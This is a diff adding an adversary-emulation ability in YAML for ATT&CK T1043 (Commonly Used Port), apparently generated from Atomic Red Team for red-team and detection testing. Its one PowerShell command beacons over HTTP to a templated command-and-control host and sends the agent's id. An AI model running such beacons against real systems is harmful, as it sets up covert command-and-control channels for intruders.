@@ -1,0 +1,13 @@
+- id: 194cae29-fbf8-4dc2-855d-b021c86af103
+  name: Commonly Used Port
+  description: Ability for Commonly Used Port (ATT&CK T1043). Generated from Atomic
+    Red Team procedures; review and test safely before use. [AUTO-INFERRED SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1043
+    name: Commonly Used Port
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
